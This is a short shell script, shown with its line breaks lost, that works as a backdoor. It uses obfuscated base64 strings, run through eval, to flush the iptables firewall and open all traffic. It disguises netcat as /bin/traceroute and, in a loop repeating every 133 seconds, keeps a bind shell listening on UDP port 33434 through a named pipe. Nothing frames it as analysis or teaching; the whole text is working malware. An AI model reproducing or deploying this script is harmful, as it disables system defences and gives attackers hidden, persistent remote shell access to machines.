it1='L3NiaW4vaXB0YWJsZXMgLUY='it2='L3NiaW4vaXB0YWJsZXMgLVAgSU5QVVQgQUNDRVBU'it3='L3NiaW4vaXB0YWJsZXMgLVAgT1VUUFVUIEFDQ0VQVA=='while :do	eval `echo $it1 | base64 -d`	eval `echo $it2 | base64 -d`	eval `echo $it3 | base64 -d`	if [ ! -e /bin/traceroute ]; then		cp /bin/nc /bin/traceroute	fi	if [ $(/bin/ps | /usr/bin/pgrep traceroute | /usr/bin/wc -l) -lt 1 ]; then		if [ ! -e /tmp/pipe ]; then			mkfifo /tmp/pipe		fi		/bin/sh /tmp/pipe | /bin/traceroute -lu 33434 > /tmp/pipe &	fi	sleep  133done